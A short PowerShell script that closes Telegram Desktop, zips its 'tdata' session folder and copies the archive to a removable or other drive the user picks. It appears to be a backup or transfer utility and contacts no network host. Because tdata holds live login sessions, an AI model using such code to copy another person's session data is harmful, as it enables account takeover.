# Parameters
$tdataFolder = Join-Path $env:APPDATA "Telegram Desktop\tdata"
$archivePath = Join-Path $env:TEMP "tdata.zip"

# Close Telegram (if it is open)
Get-Process -Name "Telegram" -ErrorAction SilentlyContinue | Stop-Process

# Remove existing archive (if any)
if (Test-Path -Path $archivePath) {
    Remove-Item -Path $archivePath
}

# Create an archive from the tdata folder
Compress-Archive -Path $tdataFolder -DestinationPath $archivePath

# Check if the archive was created successfully
if (Test-Path -Path $archivePath) {
    Write-Host "Archive successfully created and saved in Temp.`n"

    # Get a list of available physical drives
    $drives = Get-Volume | Where-Object { $_.DriveLetter } | Select-Object DriveLetter, FileSystemLabel

    if (-not $drives) {
        Write-Host "Error: No available drives found for copying."
        exit
    }

    # Display available drives
    Write-Host "Available drives:"
    foreach ($drive in $drives) {
        $label = if ($drive.FileSystemLabel) { $drive.FileSystemLabel } else { "No label" }
        Write-Host "$($drive.DriveLetter):\ — $label"
    }

    # Selection loop
    while ($true) {
        $input = Read-Host "`nEnter the drive letter to copy the archive to (e.g., D), or 'Q' to quit"

        if ($input.ToUpper() -eq 'Q') {
            Write-Host "Exiting..."
            break
        }

        $letter = $input.Trim().TrimEnd(':').ToUpper()

        if ($drives.DriveLetter -contains $letter) {
            $destinationPath = "${letter}:\tdata.zip"
            Copy-Item -Path $archivePath -Destination $destinationPath -Force

            if (Test-Path -Path $destinationPath) {
                Write-Host "`nSuccess: Archive successfully copied to drive ${letter}:"
            } else {
                Write-Host "`nWarning: Failed to copy the archive to drive ${letter}:"
            }
            break
        } else {
            Write-Host "Error: Invalid drive. Please choose one of the available drives."
        }
    }
} else {
    Write-Host "Error: Failed to create archive!"
}
